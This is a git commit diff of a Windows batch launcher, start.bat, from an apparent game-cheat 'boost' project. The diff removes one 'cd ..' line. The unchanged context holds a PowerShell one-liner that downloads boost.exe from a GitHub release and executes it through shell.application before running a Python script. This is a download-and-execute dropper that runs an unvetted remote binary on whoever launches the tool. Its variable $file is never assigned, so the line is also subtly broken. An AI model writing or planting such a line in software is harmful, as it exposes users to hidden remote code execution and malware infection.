b01dc74673114d3396222342b792cd2b17323339
cheat labs <131698090+hvbsvqdj@users.noreply.github.com>
2024-02-25 22:11:25 +0100

    start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,4 @@
 @echo off
 cd Tuto
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
-cd ..
 py boosting.py
